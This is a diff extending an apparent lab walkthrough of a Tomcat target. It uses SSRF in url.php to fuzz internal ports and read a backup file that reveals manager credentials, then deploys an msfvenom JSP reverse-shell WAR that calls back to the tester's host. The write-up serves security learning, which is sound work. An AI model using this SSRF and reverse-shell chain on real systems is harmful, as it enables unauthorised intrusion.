@@ -39,5 +39,43 @@ Directory bruteforcing with the hope to find credentials to tomcat:
 /docs
 /examples
 /manager
+I did not get far with this ghostcat vulnerability and so I check port 60000.
+This returns some output http://10.10.10.55:60000/url.php?path=http://127.0.0.1:22
+SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2 Protocol mismatch.
+Next thing is to FUZZ for more open ports that could otherwise be accessed locally only.
+└─# wfuzz -c -z range,1-65535 --hl=2 http://10.10.10.55:60000/url.php?path=http://127.0.0.1:FUZZ
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload       
+=====================================================================
+
+000000022:   200        4 L      4 W        62 Ch       "22"          
+000000090:   200        11 L     18 W       156 Ch      "90"          
+000000110:   200        17 L     24 W       187 Ch      "110"         
+000000200:   200        3 L      2 W        22 Ch       "200"         
+000000320:   200        26 L     109 W      1232 Ch     "320"         
+000000888:   200        78 L     265 W      3955 Ch     "888"         
+000003306:   200        4 L      9 W        123 Ch      "3306" 
+
+Port 888 has a backup file, I would want to know what is inside : http://10.10.10.55:60000/url.php?path=http://127.0.0.1:888
+
+GET /url.php?path=http://127.0.0.1:888?doc=backup HTTP/1.1
+Host: 10.10.10.55:60000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+   <user username="admin" password="3@g01PdhB!" roles="manager,manager-gui,admin-gui,manager-script"/>
+Now with these credentials I can head over to the tomcat page and login.http://10.10.10.55:8080/manager/html
+Next I need to generate a war file reverse shell:
+└─# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.18 LPORT=1234 -f war > shell.war
+And then deploy and run : http://10.10.10.55:8080/shell/
+And on my netcat listener I get a shell as tomcat:
+Ncat: Connection from 10.10.10.55:56108.
+id
+uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
+
+
 A good reference here:
 https://apkash8.medium.com/hunting-and-exploiting-apache-ghostcat-b7446ef83e74
